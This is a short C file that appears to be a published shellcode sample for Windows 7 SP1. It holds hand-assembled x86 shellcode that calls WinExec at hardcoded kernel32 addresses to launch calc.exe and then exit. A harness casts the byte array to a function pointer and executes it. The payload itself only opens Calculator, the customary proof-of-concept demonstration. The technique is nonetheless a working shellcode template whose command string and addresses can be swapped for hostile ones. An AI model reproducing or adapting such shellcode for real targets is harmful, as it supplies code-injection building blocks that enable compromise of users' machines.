/*
 * Shellcode Static Address
 * WinExec(Calc.exe,0); ExitProcess(0);
 * Windows 7 Home Premium Service Pack 1 x86_64
 */
#include<stdio.h>
#include<string.h>

unsigned char code[] =
"\xEB\x16"             //JMP SHORT 0x16
"\x5B"                 //POP EBX
"\x31\xC0"             //XOR EAX,EAX
"\x50"                 //PUSH EAX
"\x53"                 //PUSH EBX
"\xBB\xF1\x2F\xAD\x75" //MOV EBX, 0x75AD2FF1 ;kernel32.dll WinExec
"\xFF\xD3"             //CALL EBX
"\x31\xC0"             //XOR EAX,EAX
"\x50"                 //PUSH EAX
"\xBB\xD8\x79\xA5\x75" //MOV EBX,75A579D8 ;kernel32.dll ExitProcess
"\xFF\xD3"             //CALL EBX
"\xE8\xE5\xFF\xFF\xFF" //CALL 0xE5FFFFFF
"\x63\x61\x6C\x63\x2E\x65\x78\x65\x00";//ASCII "calc.exe", 0x00

void main()
{
printf("Shellcode Length: %d\n", strlen(code));

int (*ret)() = (int(*)())code;
ret();
}
